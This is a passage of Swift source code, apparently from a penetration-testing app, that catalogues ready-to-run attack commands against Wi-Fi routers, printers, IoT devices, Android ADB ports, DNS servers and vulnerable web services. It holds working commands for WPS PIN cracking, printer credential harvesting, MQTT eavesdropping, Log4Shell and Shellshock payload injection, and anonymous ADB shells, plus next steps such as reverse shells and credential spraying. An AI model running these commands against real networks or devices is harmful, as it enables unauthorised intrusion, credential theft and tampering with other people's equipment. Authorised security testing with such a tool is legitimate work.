            id: "wifi.wps.pixie",
            title: "WPS pixie-dust attack",
            description: "reaver -K 1 — instant WPS PIN recovery on vulnerable APs.",
            explainer: """
            Pre-2018 routers with WPS often have a flaw where the WPS PIN \
            can be derived offline from a single handshake. reaver -K 1 \
            exploits it. Hits or misses in seconds — vulnerable APs are \
            instantly cracked, patched ones return “transaction failed”.
            """,
            nextSteps: ["If PIN found → reaver --pin <pin> -i <iface> -b <bssid> recovers WPA password",
                        "If failed → fall back to handshake capture + hashcat"],
            tool: "reaver",
            command: """
            BSSID="{bssid}"; ESSID="{essid}"; CH="{channel}"; \
            echo "[target] $ESSID  $BSSID  ch=$CH"; \
            IFACE=$(sudo iw dev 2>/dev/null | awk '/Interface wlan/{print $2; exit}'); \
            [ -z "$IFACE" ] && { echo "[err] no wireless interface on this Kali host" >&2; exit 1; }; \
            sudo iw dev wm_mon del 2>/dev/null; \
            PHY=$(sudo iw dev "$IFACE" info 2>/dev/null | awk \'/wiphy/{print "phy"$2}\'); [ -z "$PHY" ] && PHY="phy0"; \
            sudo iw phy "$PHY" interface add wm_mon type monitor 2>/dev/null && sudo ip link set wm_mon up 2>/dev/null; \
            MON=$(sudo iw dev 2>/dev/null | awk \'/Interface wm_mon/{print $2}\'); \
            [ -z "$MON" ] && { echo "[err] virtual monitor (wm_mon) creation failed — chipset may not support it" >&2; exit 1; }; \
            echo "[reaver] pixie-dust on $BSSID via $MON ch=$CH"; \
            sudo -n timeout 90 reaver -i "$MON" -b "$BSSID" -c "$CH" -K 1 -vvv 2>&1 | tail -40; \
            sudo iw dev wm_mon del 2>/dev/null; sudo iw dev "${IFACE}mon" del 2>/dev/null
            """,
            timeoutSeconds: 120,
            tier: .quick, category: .wireless,
            executor: .kaliRange,
            danger: .destructive, noise: .veryLoud,
            appliesTo: [.router, .unknown]
        ),
    ]

    // MARK: - PRINTER

    public static let printerAttacks: [Attack] = [
        Attack(
            id: "printer.pjl.banner",
            title: "PJL banner (raw 9100)",
            description: "Talk JetDirect: ask the printer who it is.",
            explainer: """
            HP and most network printers accept a raw PJL session on \
            TCP/9100. The @PJL INFO ID command returns the printer's \
            firmware string, model, and sometimes serial. No auth, no \
            logging. Ground-truth fingerprint when SNMP is locked down.
            """,
            nextSteps: ["If model known → check Exploit-DB for firmware CVEs",
                        "Run printer.pjl.envvars for full configuration dump"],
            tool: "nc",
            command: "printf '\\x1b%%-12345X@PJL INFO ID\\r\\n@PJL INFO STATUS\\r\\n@PJL INFO PAGECOUNT\\r\\n\\x1b%%-12345X' | timeout 5 nc -q 1 {ip} 9100 2>&1 | head -30",
            timeoutSeconds: 15,
            tier: .quick, category: .printer,
            danger: .observation, noise: .quiet,
            appliesTo: [.printer, .unknown]
        ),
        Attack(
            id: "printer.ipp.attrs",
            title: "IPP attributes (port 631)",
            description: "curl an IPP get-printer-attributes request.",
            explainer: """
            Internet Printing Protocol (IPP) replies to a binary \
            get-printer-attributes call with model name, supported \
            formats, and queue state. Parsed-out highlights show in \
            stdout; the rest is the raw response.
            """,
            nextSteps: ["For airprint discovery → look for _ipp._tcp in mDNS",
                        "Try printing a test page via lpr -P {ip}"],
            tool: "ipptool",
            command: "ipptool -tv ipp://{ip}:631/ get-printer-attributes.test 2>&1 | head -40 || curl -s --max-time 5 --header 'Content-Type: application/ipp' --data-binary @- ipp://{ip}:631/ <<< $'\\x02\\x00\\x00\\x0b\\x00\\x00\\x00\\x01\\x01G\\x00\\x12attributes-charset\\x00\\x05utf-8H\\x00\\x1battributes-natural-language\\x00\\x05en-usE\\x00\\x0bprinter-uri\\x00\\x14ipp://localhost:631/\\x03' | xxd | head -20",
            timeoutSeconds: 15,
            tier: .quick, category: .printer,
            executor: .kali,
            danger: .observation, noise: .quiet,
            appliesTo: [.printer], aptPackage: "cups-ipp-utils"
        ),
        Attack(
            id: "printer.test.page",
            title: "Print a test page (lpr)",
            description: "Submit a small text job to the printer's raw queue.",
            explainer: """
            Sends a one-page banner with WiFiMancer ASCII art to the \
            printer to confirm you have submission rights. State-changing \
            (paper + toner) so it requires authorization. Use sparingly \
            in a real engagement; the operator can detect the job.
            """,
            nextSteps: ["For the prank version → host a custom PostScript job",
                        "Pull recent jobs with PJL @PJL FSDIRLIST"],
            tool: "lpr",
            command: "echo -e '== WiFiMancer test page ==\\nIf you can read this, the printer accepted unauthenticated jobs.\\n' | lpr -P 'wm_test_{ip}' -o raw -H {ip} 2>&1 | head -20",
            timeoutSeconds: 20,
            tier: .quick, category: .printer,
            danger: .destructive, noise: .loud,
            appliesTo: [.printer], skill: .intermediate
        ),
        Attack(
            id: "printer.praeda",
            title: "PRAEDA (printer info harvest)",
            description: "Pull config, MAC, address book, NVRAM dumps from network printers.",
            explainer: """
            PRAEDA targets the embedded admin web servers on Xerox / \
            Lexmark / Konica / Ricoh / HP printers and dumps everything \
            interesting: NVRAM, address books, scan-to-email creds. \
            Highest-ROI single tool for printer-class assessments.
            """,
            nextSteps: ["For specific creds found → spray against domain accounts",
                        "Cross-reference firmware version with searchsploit"],
            tool: "praeda",
            command: "praeda -h {ip} 2>&1 | head -80",
            timeoutSeconds: 240,
            tier: .heavy, category: .printer,
            executor: .kali,
            danger: .intrusive, noise: .loud,
            appliesTo: [.printer], skill: .advanced, aptPackage: "praeda"
        ),
    ]

    // MARK: - IOT

    public static let iotAttacks: [Attack] = [
        Attack(
            id: "iot.mqtt.probe",
            title: "MQTT broker probe (1883/8883)",
            description: "nmap mqtt-subscribe to enumerate visible topics.",
            explainer: """
            MQTT brokers in IoT setups are notoriously left open. Probing \
            anonymous-subscribe to '#' (all topics) reveals device \
            identifiers, firmware version, and often live sensor data. \
            One of the most under-checked attack surfaces on a residential \
            LAN with smart-home gear.
            """,
            nextSteps: ["For full feed → mosquitto_sub -h {ip} -t '#' -v",
                        "Look for /command, /set topics — those let you write"],
            tool: "nmap",
            command: "nmap -Pn -p 1883,8883,8884 --script mqtt-subscribe --script-args 'mqtt-subscribe.topic=#' --host-timeout 30s {ip} 2>&1 | head -60",
            timeoutSeconds: 60,
            tier: .quick, category: .iot,
            danger: .observation, noise: .quiet,
            appliesTo: [.iot, .unknown, .light, .sensor]
        ),
        Attack(
            id: "iot.mqtt.subscribe",
            title: "MQTT subscribe-all (mosquitto_sub)",
            description: "Subscribe to '#' for 30 s and dump every message.",
            explainer: """
            If the MQTT broker is open, a full wildcard subscribe shows \
            you every message that traverses it for the duration of the \
            sub. In a smart-home you'll see motion events, light state, \
            temperature, garage-door commands, sometimes plain-text PINs.
            """,
            nextSteps: ["Pick a topic with state → publish opposite to test write access",
                        "Look for /apns/, /token, /serial — those leak identity"],
            tool: "mosquitto_sub",
            command: "timeout 30 mosquitto_sub -h {ip} -p 1883 -t '#' -v -W 30 2>&1 | head -200",
            timeoutSeconds: 45,
            tier: .quick, category: .iot,
            executor: .kali,
            danger: .observation, noise: .quiet,
            appliesTo: [.iot, .unknown, .light, .sensor],
            aptPackage: "mosquitto-clients", brewPackage: "mosquitto"
        ),
        Attack(
            id: "iot.coap.discover",
            title: "CoAP discovery (5683)",
            description: "GET /.well-known/core to enumerate CoAP resources.",
            explainer: """
            CoAP is the “HTTP for constrained devices” — Hue, Zigbee \
            bridges, Tuya hubs, IKEA Tradfri, etc. The /.well-known/core \
            endpoint lists every resource the device exposes, often \
            including writable controls.
            """,
            nextSteps: ["For each found resource → coap-client coap://{ip}/<path>",
                        "Test PUT/POST against state-mutating endpoints"],
            tool: "coap-client",
            command: "coap-client -m get coap://{ip}/.well-known/core 2>&1 | head -40",
            timeoutSeconds: 20,
            tier: .quick, category: .iot,
            executor: .kali,
            danger: .observation, noise: .quiet,
            appliesTo: [.iot, .light, .sensor, .unknown],
            aptPackage: "libcoap2-bin"
        ),
        Attack(
            id: "iot.tplink.kasa",
            title: "TP-Link Kasa info (port 9999)",
            description: "Send the Kasa info packet — many models still respond unauthenticated.",
            explainer: """
            TP-Link Kasa smart plugs / bulbs / switches use a trivially \
            obfuscated TCP/9999 protocol with a fixed XOR key (0xAB). \
            One packet returns full device info: model, MAC, firmware, \
            cloud account, current state. No auth check.
            """,
            nextSteps: ["Toggle relay state → same protocol, set_relay_state command",
                        "If cloud account leaked → CHK on TP-Link account audit"],
            tool: "python3",
            command: """
            python3 -c "import socket,struct,json
            k=0xAB; m=b'{\\"system\\":{\\"get_sysinfo\\":{}}}'; e=bytearray()
            for c in m: k^=c; e.append(k)
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(4); s.connect(('{ip}',9999))
            s.send(struct.pack('>I', len(e))+bytes(e))
            data=s.recv(4096); s.close()
            ln=struct.unpack('>I',data[:4])[0]; b=data[4:4+ln]; k=0xAB; out=bytearray()
            for c in b: out.append(k^c); k=c
            print(json.dumps(json.loads(out), indent=2))" 2>&1 | head -40
            """,
            timeoutSeconds: 15,
            tier: .quick, category: .iot,
            danger: .observation, noise: .quiet,
            appliesTo: [.iot, .light, .unknown]
        ),
        Attack(
            id: "iot.wol.wake",
            title: "Wake-on-LAN magic packet",
            description: "etherwake — broadcast a magic packet to power the host on.",
            explainer: """
            Sends the standard WoL magic packet (FF×6 + MAC×16) so a \
            sleeping or shut-down host wakes up. Useful if a device \
            disappeared from your scan and you want to bring it back \
            without physical access. Requires the target's MAC; the app \
            knows the MAC for any device it's seen.
            """,
            nextSteps: ["Re-run a recon scan in 30 s to confirm the host is up",
                        "If no response → target may have WoL disabled in BIOS"],
            tool: "etherwake",
            command: "etherwake $(printf '%s' '{ip}' | tr -d ':') 2>&1 || wakeonlan {ip} 2>&1",
            timeoutSeconds: 5,
            tier: .quick, category: .iot,
            executor: .local,
            danger: .observation, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable),
            brewPackage: "wakeonlan"
        ),
        Attack(
            id: "iot.zigbee.scan",
            title: "Zigbee / Z-Wave radio scan (ZGRAT)",
            description: "Scan local airwaves for unencrypted ZB/ZW frames.",
            explainer: """
            Requires a ZB radio (CC2531 / CC2652) attached to Kali. \
            Listens passively for Zigbee or Z-Wave traffic on the standard \
            channels and prints PAN IDs, network keys (if leaked), and \
            join requests.
            """,
            nextSteps: ["For full capture → use whsniff with Wireshark",
                        "If keys captured → KillerBee can replay frames"],
            tool: "whsniff",
            command: "echo 'Note: needs CC2531 USB dongle. Listing channels in band:'; for c in 11 13 15 17 19 21 23 25; do echo \"-- ch $c\"; timeout 3 whsniff -c $c 2>&1 | head -5; done",
            timeoutSeconds: 60,
            tier: .heavy, category: .iot,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .advanced, aptPackage: "whsniff"
        ),
    ]

    // MARK: - DNS

    public static let dnsAttacks: [Attack] = [
        Attack(
            id: "dns.zone-transfer",
            title: "DNS zone transfer (AXFR)",
            description: "Try AXFR against the host on port 53.",
            explainer: """
            Misconfigured DNS servers respond to AXFR with the entire zone \
            file — every internal hostname, IP, mail server, txt record. \
            Pre-2010 was common; in 2026 it still happens on lab and \
            embedded gear.
            """,
            nextSteps: ["For each hostname found → resolve and add to scope",
                        "Look for _kerberos / _ldap / _msdcs records — domain controller hints"],
            tool: "dig",
            command: "for d in $(host {ip} | awk '{print $NF}' | sed 's/\\.$//'); do echo \"## $d\"; dig +time=3 +tries=1 axfr @{ip} \"$d\" 2>&1 | head -25; done; dig +time=3 +tries=1 chaos txt version.bind @{ip} 2>&1 | head -10",
            timeoutSeconds: 30,
            tier: .quick, category: .dns,
            danger: .observation, noise: .quiet,
            appliesTo: [.router, .laptop, .desktop, .unknown]
        ),
        Attack(
            id: "dns.dnsx.bruteforce",
            title: "Subdomain bruteforce (dnsx)",
            description: "Resolve a small wordlist of subdomains against the host's apex.",
            explainer: """
            ProjectDiscovery's dnsx tries each name in the wordlist as \
            <word>.<apex> and prints the live resolutions. Catches \
            internal-only names that aren't in cert transparency logs \
            (subfinder won't find them).
            """,
            nextSteps: ["For each live name → run nmap / nuclei on it",
                        "Combine with dnsx wildcard detection to filter false positives"],
            tool: "dnsx",
            command: "APEX=$(host {ip} | awk '{print $NF}' | sed 's/\\.$//' | head -1); echo \"apex=$APEX\"; for sub in admin api auth dev staging test internal vpn mail webmail portal cpanel ns1 ns2; do echo \"$sub.$APEX\"; done | dnsx -silent -resp -timeout 3 2>&1 | head -30",
            timeoutSeconds: 60,
            tier: .quick, category: .dns,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: [.router, .laptop, .desktop, .unknown],
            aptPackage: "dnsx"
        ),
        Attack(
            id: "dns.traceroute",
            title: "Path trace (mtr / traceroute)",
            description: "12-hop traceroute showing the route from executor to target.",
            explainer: """
            Useful primarily to confirm reachability and understand \
            whether the target is on the local LAN, behind a NAT, or on \
            a VPN tunnel. mtr does ICMP+UDP+TCP probes interleaved which \
            makes it more robust against firewalls that drop one type.
            """,
            nextSteps: ["If too many hops → target is via VPN, latency will dominate",
                        "If 1 hop → target on same L2 segment, ARP/NDP attacks viable"],
            tool: "mtr",
            command: "mtr -n -c 3 -r --no-dns -m 12 -i 0.3 {ip} 2>&1 | head -20 || traceroute -n -w 1 -q 1 -m 12 {ip} 2>&1 | head -20",
            timeoutSeconds: 30,
            tier: .quick, category: .dns,
            danger: .observation, noise: .quiet,
            appliesTo: Set(DeviceKind.allTargetable),
            brewPackage: "mtr"
        ),
    ]

    // MARK: - BLUETOOTH

    public static let bluetoothAttacks: [Attack] = [
        Attack(
            id: "bt.scan.local",
            title: "Bluetooth scan (this Mac)",
            description: "system_profiler — list every paired & visible BT device.",
            explainer: """
            macOS exposes the Bluetooth controller's view via \
            system_profiler. Lists paired peripherals with MAC, vendor \
            string, RSSI for visible peers. Pure local — no probe goes \
            out on the network.
            """,
            nextSteps: ["For LE scan → use blueutil or hcitool on Kali with a USB adapter",
                        "If a watch / earphones found → check airdrop side channel"],
            tool: "system_profiler",
            command: "system_profiler SPBluetoothDataType 2>&1 | head -120",
            timeoutSeconds: 20,
            tier: .quick, category: .bluetooth,
            executor: .local,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable)
        ),
        Attack(
            id: "bt.le.scan",
            title: "Bluetooth LE scan (hcitool)",
            description: "hcitool lescan — discover BLE peripherals over a USB BT dongle.",
            explainer: """
            BLE peripherals (smartwatches, fitness trackers, beacons) \
            advertise constantly. hcitool lescan listens and prints MACs + \
            advertised names. Requires a real BT controller (hci0) on \
            Kali; built-in laptop chipsets work too.
            """,
            nextSteps: ["For services → gatttool -I -b <MAC> then primary",
                        "If wearable identified → look up vendor in BlueZ DB"],
            tool: "hcitool",
            command: "timeout 20 hcitool lescan --duplicates 2>&1 | head -40",
            timeoutSeconds: 30,
            tier: .quick, category: .bluetooth,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable),
            aptPackage: "bluez"
        ),
    ]

    // MARK: - MOBILE

    public static let mobileAttacks: [Attack] = [
        Attack(
            id: "mobile.airdrop.beacon",
            title: "AirDrop beacon scan",
            description: "Watch BLE for AirDrop / Continuity advertisements.",
            explainer: """
            iPhones, iPads, Macs continuously broadcast Continuity / \
            AirDrop frames over BLE. The frames leak a partial SHA-256 of \
            the device's Apple ID phone-number / email. Researchers \
            (Heinrich et al.) showed the hash space is small enough to \
            crack offline.
            """,
            nextSteps: ["For full crack → run Owl / OpenDrop research toolkit",
                        "Hash → ID rainbow tables exist for common phone prefixes"],
            tool: "hcitool",
            command: "echo 'NOTE: passive BLE listen, ~30 s'; timeout 30 hcitool lescan --duplicates 2>&1 | head -40",
            timeoutSeconds: 45,
            tier: .heavy, category: .mobile,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: [.iphone, .ipad, .applish, .watch, .audio]
        ),
        Attack(
            id: "mobile.adb.connect",
            title: "ADB connect (Android dev port 5555)",
            description: "Try wireless ADB — devices left in dev mode are owned.",
            explainer: """
            Android phones / tablets / TVs in developer mode with \
            wireless debugging enabled accept anonymous ADB on TCP/5555. \
            From there: full shell, /data access, install/uninstall apps. \
            Fire TV sticks ship with this enabled by default.
            """,
            nextSteps: ["adb -s {ip}:5555 shell — drop to a real shell",
                        "adb pull /data/data/<pkg>/databases/* — extract app data"],
            tool: "adb",
            command: "adb connect {ip}:5555 2>&1 | head -10; sleep 1; adb -s {ip}:5555 shell getprop ro.product.model 2>&1 | head -5; adb -s {ip}:5555 shell pm list packages -3 2>&1 | head -20",
            timeoutSeconds: 30,
            tier: .quick, category: .mobile,
            danger: .destructive, noise: .quiet,
            appliesTo: [.phone, .tv, .unknown], brewPackage: "android-platform-tools"
        ),
    ]

    // MARK: - MITM

    public static let mitmAttacks: [Attack] = [
        Attack(
            id: "mitm.bettercap.recon",
            title: "Bettercap host recon (1 sweep)",
            description: "bettercap -caplet net.recon -- one full sweep, then exit.",
            explainer: """
            Bettercap is the modern equivalent of ettercap — actor-style \
            engine with caplets for ARP spoofing, DNS hijack, sslstrip2, \
            and rogue AP. The recon caplet just builds a host list \
            without poisoning. Good baseline before any active MITM.
            """,
            nextSteps: ["For ARP poisoning → run native CutEngine instead (it's safer)",
                        "For HTTPS capture → bettercap https.proxy + sslstrip2"],
            tool: "bettercap",
            command: "bettercap -no-colors -eval 'set events.stream.output /tmp/wm_bcap.log; net.recon on; sleep 8; net.show; q' 2>&1 | head -100",
            timeoutSeconds: 30,
            tier: .heavy, category: .mitm,
            executor: .kali,
            danger: .observation, noise: .quiet,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .intermediate, aptPackage: "bettercap"
        ),
        Attack(
            id: "mitm.dns.captive",
            title: "Captive portal DNS check",
            description: "dig generate-204 — does the LAN intercept DNS?",
            explainer: """
            Hotel / airport / corporate Wi-Fi often hijacks DNS to force \
            a captive portal. Querying generate_204.gstatic.com returns \
            an empty 204 on the open internet — anything else means DNS \
            is being rewritten and the LAN is captive.
            """,
            nextSteps: ["If captive → check if you can use DoH (1.1.1.1/dns-query) to bypass",
                        "Test if MAC randomization circumvents the splash"],
            tool: "dig",
            command: "echo '## via Mac resolver:'; dig +short generate_204.gstatic.com A 2>&1 | head -5; echo '## via 1.1.1.1:'; dig +short @1.1.1.1 generate_204.gstatic.com A 2>&1 | head -5; echo '## via target:'; dig +short @{ip} generate_204.gstatic.com A 2>&1 | head -5; echo '## HTTP probe:'; curl -s -o /dev/null -w 'code=%{http_code} via=%{remote_ip}\\n' --max-time 4 http://connectivitycheck.gstatic.com/generate_204",
            timeoutSeconds: 15,
            tier: .quick, category: .mitm,
            danger: .passive, noise: .silent,
            appliesTo: [.router, .unknown]
        ),
    ]

    // MARK: - EXPLOIT (CVE-specific PoCs)

    public static let exploitAttacks: [Attack] = [
        Attack(
            id: "exploit.eternal.blue",
            title: "Check EternalBlue / MS17-010",
            description: "smb-vuln-ms17-010 NSE script.",
            explainer: """
            CVE-2017-0144 is the SMBv1 RCE that powered WannaCry. Years \
            after the patch shipped, you still find unpatched embedded \
            kit (MRI machines, kiosks, IoT gateways) running affected \
            Windows kernels. nmap's NSE check is a single packet exchange \
            — non-destructive, but the exploit itself crashes the box.
            """,
            nextSteps: ["If VULNERABLE → Metasploit module exploit/windows/smb/ms17_010_eternalblue",
                        "Verify with the explicit smb-vuln-ms17-010 script output"],
            tool: "nmap",
            command: "nmap -Pn -p 445 --script smb-vuln-ms17-010 --script-args 'unsafe=0' {ip} 2>&1 | head -40",
            timeoutSeconds: 60,
            tier: .quick, category: .exploit,
            danger: .observation, noise: .loud,
            appliesTo: [.laptop, .desktop, .unknown],
            skill: .intermediate
        ),
        Attack(
            id: "exploit.bluekeep",
            title: "Check BlueKeep / CVE-2019-0708",
            description: "rdp-vuln-ms12-020 + cve-2019-0708 script.",
            explainer: """
            BlueKeep is the wormable RDP RCE in Windows 7 / Server 2008 \
            R2. The check is a single connection that does not crash the \
            host. Real exploitation is highly unstable; the check just \
            tells you if the target is in the vulnerable population.
            """,
            nextSteps: ["If VULNERABLE → check msf rdp_check + ms12_020_check first",
                        "Patch level audit via smb-os-discovery to confirm Windows 7"],
            tool: "nmap",
            command: "nmap -Pn -p 3389 --script rdp-vuln-ms12-020 {ip} 2>&1 | head -30",
            timeoutSeconds: 45,
            tier: .quick, category: .exploit,
            danger: .observation, noise: .loud,
            appliesTo: [.laptop, .desktop, .unknown],
            skill: .intermediate
        ),
        Attack(
            id: "exploit.log4shell.probe",
            title: "Log4Shell probe (CVE-2021-44228)",
            description: "Inject JNDI marker into common HTTP headers, watch for callbacks.",
            explainer: """
            Sends a benign JNDI marker (${jndi:ldap://probe-marker/x}) \
            in User-Agent, X-Forwarded-For, and the URL path. If the \
            target is a vulnerable Java app and you have an interactsh \
            URL configured, you'd see the DNS callback. This version \
            just submits the probe — for real validation pair with \
            interactsh-client.
            """,
            nextSteps: ["For real validation → run interactsh-client and inject its URL",
                        "If vulnerable Java apps → attack chain to RCE via marshalsec"],
            tool: "curl",
            command: "MARK='${jndi:ldap://wm-l4s-probe.invalid/x}'; for h in 'User-Agent' 'X-Api-Version' 'X-Forwarded-For' 'Referer'; do echo \"## $h\"; curl -s -o /dev/null -w 'code=%{http_code}\\n' --max-time 5 -H \"$h: $MARK\" \"http://{ip}/\"; done; curl -s -o /dev/null -w 'path-probe=%{http_code}\\n' --max-time 5 \"http://{ip}/\\$\\{jndi:ldap://wm-l4s-probe.invalid/x\\}\"",
            timeoutSeconds: 30,
            tier: .quick, category: .exploit,
            danger: .intrusive, noise: .loud,
            appliesTo: [.laptop, .desktop, .unknown, .iot, .router],
            skill: .advanced
        ),
        Attack(
            id: "exploit.shellshock",
            title: "Shellshock CGI probe (CVE-2014-6271)",
            description: "Inject the shellshock marker into common cgi-bin paths.",
            explainer: """
            Old, but routers and IoT boxes shipped with Bash 3.2 / 4.x \
            CGI handlers for years. The probe sends a User-Agent with \
            the magic “() { :;}; echo VULN” payload to common CGI paths. \
            If the response body contains VULN, the host runs your bash \
            in the request context.
            """,
            nextSteps: ["If VULN → escalate to a reverse shell via the same header",
                        "Patch test → upgrade bash; rerun"],
            tool: "curl",
            command: "PAY='() { :;}; echo SHELLSHOCK_PROBE_VULN'; for path in /cgi-bin/test.cgi /cgi-bin/status.cgi /cgi-bin/index.cgi /cgi-bin/admin.cgi /cgi-bin/luci /cgi-bin/webproc; do echo \"## $path\"; curl -s --max-time 5 -A \"$PAY\" \"http://{ip}$path\" | grep -q SHELLSHOCK_PROBE_VULN && echo VULN || echo not-vuln; done",
            timeoutSeconds: 30,
            tier: .quick, category: .exploit,
            danger: .intrusive, noise: .loud,
            appliesTo: [.router, .iot, .unknown]
        ),
    ]

    // MARK: - filtering

    public static func attacks(for kind: DeviceKind) -> [Attack] {
        all.filter { $0.appliesTo.contains(kind) }
            .sorted {
                if $0.tier != $1.tier { return $0.tier.sortKey < $1.tier.sortKey }
                if $0.category != $1.category { return $0.category.rawValue < $1.category.rawValue }
                return $0.title < $1.title
            }
    }
}
